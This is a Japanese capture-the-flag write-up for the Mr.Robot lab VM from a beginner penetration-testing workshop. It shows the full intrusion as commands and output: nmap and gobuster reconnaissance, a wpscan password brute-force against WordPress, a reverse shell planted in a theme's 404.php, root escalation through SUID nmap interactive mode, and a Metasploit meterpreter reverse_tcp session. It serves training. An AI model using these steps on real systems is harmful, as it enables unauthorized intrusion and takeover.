# TMCIT × 大和セキュリティ ペネトレ超入門（オンライン参加）
# Mr.Robot WriteUp

KaliとMr.Robotの.ovaが配布される。  
FLAGは`key-X-of-3.txt`形式で提供。

## FLAG.1

### Mr.RobotのIPアドレスを調査
```shell
root@kali:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:0c:29:9d:e3:4a brd ff:ff:ff:ff:ff:ff
    inet 192.168.188.130/24 brd 192.168.188.255 scope global dynamic noprefixroute eth0
       valid_lft 1648sec preferred_lft 1648sec
    inet6 fe80::20c:29ff:fe9d:e34a/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
root@kali:~# arp-scan 192.168.188.0/24
Interface: eth0, type: EN10MB, MAC: 00:0c:29:9d:e3:4a, IPv4: 192.168.188.130
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.188.2   00:50:56:e8:71:b2       VMware, Inc.
192.168.188.1   00:50:56:c0:00:08       VMware, Inc.
192.168.188.128 00:0c:29:25:7b:03       VMware, Inc.
192.168.188.254 00:50:56:eb:cb:18       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 2.031 seconds (126.05 hosts/sec). 4 responded
```
`192.168.188.128`であることが分かる。


### Mr.Robotに対するポートスキャン
```shell
root@kali:~# nmap -A -Pn -p- -v --reason -n 192.168.188.128
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-28 12:57 JST
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 12:57
Completed NSE at 12:57, 0.00s elapsed
Initiating NSE at 12:57
Completed NSE at 12:57, 0.00s elapsed
Initiating NSE at 12:57
Completed NSE at 12:57, 0.00s elapsed
Initiating ARP Ping Scan at 12:57
Scanning 192.168.188.128 [1 port]
Completed ARP Ping Scan at 12:57, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:57
Scanning 192.168.188.128 [65535 ports]
Discovered open port 443/tcp on 192.168.188.128
Discovered open port 80/tcp on 192.168.188.128
SYN Stealth Scan Timing: About 19.42% done; ETC: 13:00 (0:02:09 remaining)
SYN Stealth Scan Timing: About 46.88% done; ETC: 12:59 (0:01:09 remaining)
Completed SYN Stealth Scan at 12:59, 107.38s elapsed (65535 total ports)
Initiating Service scan at 12:59
Scanning 2 services on 192.168.188.128
Completed Service scan at 12:59, 12.06s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 192.168.188.128
NSE: Script scanning 192.168.188.128.
Initiating NSE at 12:59
Completed NSE at 12:59, 2.58s elapsed
Initiating NSE at 12:59
Completed NSE at 12:59, 0.10s elapsed
Initiating NSE at 12:59
Completed NSE at 12:59, 0.00s elapsed
Nmap scan report for 192.168.188.128
Host is up, received arp-response (0.00096s latency).
Not shown: 65532 filtered ports
Reason: 65532 no-responses
PORT    STATE  SERVICE  REASON         VERSION
22/tcp  closed ssh      reset ttl 64
80/tcp  open   http     syn-ack ttl 64 Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http syn-ack ttl 64 Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
|_SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
MAC Address: 00:0C:29:25:7B:03 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
Uptime guess: 0.145 days (since Sat Nov 28 09:31:18 2020)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   0.96 ms 192.168.188.128

NSE: Script Post-scanning.
Initiating NSE at 12:59
Completed NSE at 12:59, 0.00s elapsed
Initiating NSE at 12:59
Completed NSE at 12:59, 0.00s elapsed
Initiating NSE at 12:59
Completed NSE at 12:59, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 124.54 seconds
           Raw packets sent: 131180 (5.774MB) | Rcvd: 100 (4.370KB)
```
`ssh`は閉じていて、Webの`80`と`443`だけ空いている模様。

### フォルダ・ファイルの調査
使い慣れたgobusterをインストールし、実行。

```shell
root@kali:~# apt install gobuster
root@kali:~# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -e -x php,html,txt -u http://192.168.188.128  -t 40
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.188.128
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,html,txt
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/11/28 13:11:52 Starting gobuster
===============================================================
http://192.168.188.128/sitemap (Status: 200)
http://192.168.188.128/index.html (Status: 200)
http://192.168.188.128/index.php (Status: 301)
http://192.168.188.128/images (Status: 301)
http://192.168.188.128/blog (Status: 301)
http://192.168.188.128/rss (Status: 301)
http://192.168.188.128/login (Status: 302)
http://192.168.188.128/video (Status: 301)
http://192.168.188.128/0 (Status: 301)
http://192.168.188.128/feed (Status: 301)
http://192.168.188.128/image (Status: 301)
http://192.168.188.128/atom (Status: 301)
http://192.168.188.128/wp-content (Status: 301)
http://192.168.188.128/admin (Status: 301)
http://192.168.188.128/audio (Status: 301)
http://192.168.188.128/intro (Status: 200)
http://192.168.188.128/wp-login (Status: 200)
http://192.168.188.128/wp-login.php (Status: 200)
http://192.168.188.128/css (Status: 301)
http://192.168.188.128/rss2 (Status: 301)
http://192.168.188.128/license (Status: 200)
http://192.168.188.128/license.txt (Status: 200)
http://192.168.188.128/wp-includes (Status: 301)
http://192.168.188.128/js (Status: 301)
http://192.168.188.128/wp-register.php (Status: 301)
http://192.168.188.128/Image (Status: 301)
http://192.168.188.128/wp-rss2.php (Status: 301)
http://192.168.188.128/rdf (Status: 301)
http://192.168.188.128/page1 (Status: 301)
http://192.168.188.128/readme (Status: 200)
http://192.168.188.128/readme.html (Status: 200)
http://192.168.188.128/robots (Status: 200)
http://192.168.188.128/robots.txt (Status: 200)
[!] Keyboard interrupt detected, terminating.
[ERROR] 2020/11/28 13:26:51 [!] context canceled
===============================================================
```

セオリー通り、`robots.txt`にアクセス。
> http://192.168.188.128/robots.txt  
User-agent: *  
fsocity.dic  
key-1-of-3.txt

1つ目の`FLAG`が入手できる。
> http://192.168.188.128/key-1-of-3.txt  
073403c8a58a1f80d943455fb30724b9

## FLAG.2
gobusterの結果、`wp-login.php`の存在が分かるので、Webアクセス。

ID,PWを適当に入力すると、`ERROR: Invalid username.`と返ってくるため、  
IDの成否が判定できるログイン画面であることが分かる。

提供された`Mr.Robot`のスライドに記載された`Elliot Alderson`という名前を試し、  
`elliot`ユーザが存在することが判明する。

パスワードのリストは`rockyou.txt`を使ってもよさそうだが、  
ここは`robots.txt`で判明した`fsocity.dic`を使ってみる。

ファイルの中身を見ると、実は同じ文字列が何度も出てきているため、  
重複を排除して新しいリストを作り直す。
```shell
yamato@kali:~/Downloads$ sort fsocity.dic | uniq > new.dic
yamato@kali:~/Downloads$ ls -l
-rw-r--r-- 1 yamato yamato 7245381 11月 28 13:48 fsocity.dic
-rw-r--r-- 1 yamato yamato   96747 11月 28 14:29 new.dic
```

`elliot`と`new.dic`でログイン試行する。
```shell
root@kali:~# wpscan --url http://192.168.188.128 --wp-content-dir '/wp-login.php'  --passwords  /home/yamato/Downloads/new.dic --usernames 'elliot'
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.7.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.188.128/
[+] Started: Sat Nov 28 14:32:21 2020

Interesting Finding(s):

[+] http://192.168.188.128/
 | Interesting Entries:
 |  - Server: Apache
 |  - X-Mod-Pagespeed: 1.9.32.3-4523
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://192.168.188.128/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] http://192.168.188.128/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://192.168.188.128/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] http://192.168.188.128/wp-login.php/backup-db/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 70%
 | Reference: https://github.com/wpscanteam/wpscan/issues/422

[+] This site has 'Must Use Plugins': http://192.168.188.128/wp-login.php/mu-plugins/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 80%
 | Reference: http://codex.wordpress.org/Must_Use_Plugins

[+] http://192.168.188.128/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.3.25 identified (Latest, released on 2020-10-29).
 | Found By: Rss Generator (Aggressive Detection)
 |  - http://192.168.188.128/feed/, <generator>https://wordpress.org/?v=4.3.25</generator>
 |  - http://192.168.188.128/comments/feed/, <generator>https://wordpress.org/?v=4.3.25</generator>

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <==============================================================================> (21 / 21) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc Multicall against 1 user/s
[SUCCESS] - elliot / ER28-0652                                                                                                                             
All Found                                                                                                                                                  
Progress Time: 00:00:38 <=======================================                                                           > (9 / 22) 40.90%  ETA: ??:??:??

[i] Valid Combinations Found:
 | Username: elliot, Password: ER28-0652

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Sat Nov 28 14:33:08 2020
[+] Requests Done: 66
[+] Cached Requests: 6
[+] Data Sent: 16.829 KB
[+] Data Received: 1001.208 KB
[+] Memory used: 221.398 MB
[+] Elapsed time: 00:00:47
```
`Username: elliot, Password: ER28-0652`が判明するので、管理画面にログインする。  
WordPressなので、リバースシェル用の.phpを配置できればシェルを取れるはず。

メニューのAppearanceからEdit themeに進み、404.phpのコードを表示。  
過去に取得したリバースシェル用のコードにそっくり入れ替え、宛先をKaliのIPアドレスにして保存。

Kali側で`nc`コマンドを実行し待ち構え、ブラウザで`http://192.168.188.128/404.php`にアクセスする。

```shell
root@kali:~# nc -lvnp 4444       
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.188.128.
Ncat: Connection from 192.168.188.128:36201.
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 05:43:44 up  5:16,  0 users,  load average: 0.01, 0.24, 1.26
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

このままでは使いづらいので、`/bin/bash`に切り替える。
```shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/$ 
```

FLAG.2のファイルはすぐ見つかるが、権限がなく開けない。  
同じフォルダに置かれているパスワードのハッシュを確認する。
```shell
daemon@linux:/$ ls /home
ls /home
robot
daemon@linux:/$ cd /home/robot    
cd /home/robot
daemon@linux:/home/robot$ ls
ls
key-2-of-3.txt  password.raw-md5
daemon@linux:/home/robot$ cat key-2-of-3.txt
cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
daemon@linux:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
daemon@linux:/home/robot$ 
```

ハッシュ化前の値を調べる。
> https://md5hashing.net/hash  
before:c3fcd3d76192e4007dfb496cca67e13b  
after:abcdefghijklmnopqrstuvwxyz

パスワードが判明したので、`robot`ユーザに切り替えてFLAG.2を入手。
```shell
daemon@linux:/home/robot$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

## FLAG.3
`shell -l`での情報から`root`になるのは無理そう。
```shell
robot@linux:~$ sudo -l
sudo -l
[sudo] password for robot: abcdefghijklmnopqrstuvwxyz

Sorry, user robot may not run sudo on linux.
```

SUIDが設定されているアプリケーションを探す。
```shell
robot@linux:/$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```
`nmap`を対話モードで実行し、shellを実行すると`root`に切り替わり、FLAG.3を入手できる。
```shell
robot@linux:/$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> ! sh
! sh
# whoami
whoami
root
# find / -name key-3-of-3.txt
find / -name key-3-of-3.txt
/root/key-3-of-3.txt
# cat /root/key-3-of-3.txt
cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

## FLAG.2 別解：Metasploitを使ってShellを取る
```
root@kali:~# msfconsole -q
msf5 > search wordpress
                                                                                                                                                        
Matching Modules                                                                                                                                        
================                                                                                                                                        
                                                                                                                                                        
   #   Name                                                           Disclosure Date  Rank       Check  Description                                    
   -   ----                                                           ---------------  ----       -----  -----------                                    
   43  exploit/unix/webapp/wp_admin_shell_upload                      2015-02-21       excellent  Yes    WordPress Admin Shell Upload
   44  exploit/unix/webapp/wp_advanced_custom_fields_exec             2012-11-14       excellent  Yes    WordPress Plugin Advanced Custom Fields Remote File Inclusion
   45  exploit/unix/webapp/wp_ajax_load_more_file_upload              2015-10-10       excellent  Yes    Wordpress Ajax Load More PHP Upload Vulnerability

msf5 > use 43
msf5 exploit(unix/webapp/wp_admin_shell_upload) > show options

Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   ER28-0652        yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.188.128  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /wp-login.php    yes       The base path to the wordpress application
   USERNAME   elliot           yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.188.130  yes       The listen address (an interface may be specified)
   LPORT  4848             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set RHOST 192.168.188.128
RHOST => 192.168.188.128
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set RPORT 80
RPORT => 80
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /
TARGETURI => wp-login.php
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME elliot
USERNAME => elliot
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD ER28-0652
PASSWORD => ER28-0652
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set WPCHECK false
WPCHECK => false
msf5 exploit(unix/webapp/wp_admin_shell_upload) > run

[*] Started reverse TCP handler on 192.168.188.130:4444
[*] Authenticating with WordPress using elliot:ER28-0652...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wp-content/plugins/aKcqIWOOJn/yPnAsZCWMw.php...
[*] Sending stage (38288 bytes) to 192.168.188.128
[*] Meterpreter session 1 opened (192.168.188.130:4848 -> 192.168.188.128:33614) at 2020-11-28 16:48:39 +0900
[!] This exploit may require manual cleanup of 'yPnAsZCWMw.php' on the target
[!] This exploit may require manual cleanup of 'aKcqIWOOJn.php' on the target
[!] This exploit may require manual cleanup of '../aKcqIWOOJn' on the target

meterpreter >  python -c 'import pty; pty.spawn("/bin/bash")'
[-] Unknown command: python.
meterpreter > whoami
[-] Unknown command: whoami.
meterpreter > ls
Listing: /opt/bitnami/apps/wordpress/htdocs/wp-content/plugins/aKcqIWOOJn
=========================================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  138   fil   2020-11-28 16:48:22 +0900  aKcqIWOOJn.php
100644/rw-r--r--  1116  fil   2020-11-28 16:48:22 +0900  yPnAsZCWMw.php

meterpreter > shell
python -c 'import pty; pty.spawn("/bin/bash")'
<ps/wordpress/htdocs/wp-content/plugins/aKcqIWOOJn$ cd /
daemon@linux:/$ 
```

